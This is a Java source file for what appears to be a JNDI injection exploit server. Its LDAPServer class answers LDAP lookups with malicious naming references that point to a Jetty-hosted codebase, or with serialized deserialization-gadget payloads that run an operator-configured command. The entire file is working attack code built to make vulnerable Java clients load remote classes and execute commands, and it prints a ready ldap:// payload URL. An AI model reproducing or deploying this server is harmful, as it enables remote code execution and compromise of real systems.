package top.racerz.server;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import sun.misc.BASE64Encoder;
import top.racerz.utils.Logger;
import top.racerz.utils.StringUtil;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.URL;


public class LDAPServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    protected URL codebase_url;

    private String addr;

    private int port;

    private int httpPort;

    private int option;

    private String exploit;

    private String gadget;

    public static void main(String[] args) throws Exception{
        // test
    }

    public LDAPServer(String addr, int port, int httpPort, int option, String exploit, String gadget) throws Exception {
        this.addr = addr;
        this.port = port;
        this.httpPort = httpPort;
        this.option = option;
        this.exploit = exploit;
        this.gadget = gadget;

        this.codebase_url = new URL("http://" + addr + ":" + httpPort + "/");
        Thread threadJetty = new Thread(new JettyServer(httpPort));
        threadJetty.start();
        Logger.info("your payload: " + "ldap://" + addr + ":" + port + "/" + exploit);
    }

    public void run() {
        Logger.print("-------------------------- 服务端日志 ---------------------------");
        try {
            // At least one base DN must be specified
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            // 监听者配置
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
            ));

            // 设置拦截器 手动处理请求
            config.addInMemoryOperationInterceptor(new OptionInterceptor(codebase_url, option, exploit, gadget));

            InMemoryDirectoryServer server = new InMemoryDirectoryServer(config);
            // Start the server so it will accept client connections
            server.startListening();
            Logger.info("LDAP  服务器启动 >> 监听地址：0.0.0.0:" + port);

        }catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OptionInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        // 这里设置一个选择来选择服务端返回类型
        private int option;

        // 指定利用方式：命令执行、目录遍历 ...
        private String exploit;

        // TODO 利用的反序列化 gadget 可扩充在 payload 目录下，或直接用 yso类 项目
        private String gadget;

        public OptionInterceptor(URL codebase, int option, String exploit, String gadget) {
            this.codebase = codebase;
            this.option = option;
            this.exploit = exploit;
            this.gadget = gadget;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            // 创建一个新条目并构造属性
            Entry entry = new Entry(base);
            try {
                switch (option) {
                    case 1: sendResultAsReference(result, exploit, entry);
                    break;
                    case 2: sendResultAsSerialzedData(result, exploit, entry);
                    break;
                    case 3: sendResultAsReferenceAddress(result, exploit, entry);
                    break;
                    default: throw new RuntimeException("Invalid Option");
                }
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResultAsReference(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            String urlString = this.codebase.toString();
            // TODO 根据 cli 来获取
            String javaFactory = exploit;
            if (javaFactory != null) {
                URL url = new URL(urlString + javaFactory.concat(".class"));
                // TODO Logger
                Logger.warning("  LDAP 服务器 >> 发送引用：" + base + " 重定向至 " + url);
                // 构造条目的属性
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaFactory", javaFactory);
                e.addAttribute("javaCodeBase", urlString);
                // 返回给客户端
                result.sendSearchEntry(e);
                // 替换客户端返回内容
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } else {
                // TODO Logger
                Logger.error("  LDAP服务器 >> 无法找到相关引用：" + base);
            }
        }

        protected void sendResultAsSerialzedData(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {

            Logger.info("GET /" + gadget + " TCP/IP 200 -");

            e.addAttribute("javaClassName", "foo");
            // TODO: 命令执行的具体
            String[] command = StringUtil.getCurrentPropertiesValue("Command").split(" ");
            Class<?> clazz = Class.forName("top.racerz.payload." + this.gadget);
            Method method = clazz.getMethod("getPayload", String[].class);
            byte[] payload = (byte[]) method.invoke(null, (Object) command);
            e.addAttribute("javaSerializedData", payload);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

        protected void sendResultAsReferenceAddress(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {

            Logger.info("GET /" + gadget + " TCP/IP 200 -");

            e.addAttribute("javaClassName", "foo");
            e.addAttribute("objectClass", "javaNamingReference");
            String command = StringUtil.getCurrentPropertiesValue("Command");
            Class<?> clazz = Class.forName("top.racerz.payload." + this.gadget);
            Method method = clazz.getMethod("getPayload", String.class);
            byte[] payload = (byte[]) method.invoke(null, command);
            e.addAttribute("javaSerializedData", payload);

            e.addAttribute("javaReferenceAddress", "$1$String$$" +
                    new BASE64Encoder().encode(payload));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

}
